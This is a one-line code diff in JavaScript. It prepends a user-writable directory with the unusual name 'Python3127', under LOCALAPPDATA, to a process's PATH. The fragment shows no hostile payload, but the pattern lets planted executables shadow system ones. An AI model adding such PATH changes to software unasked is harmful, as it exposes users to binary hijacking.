@@ -1,0 +1,1 @@
+const Y=path.join(process.env.LOCALAPPDATA,"Programs\\Python\\Python3127");env.PATH=Y+";"+process.env.PATH;
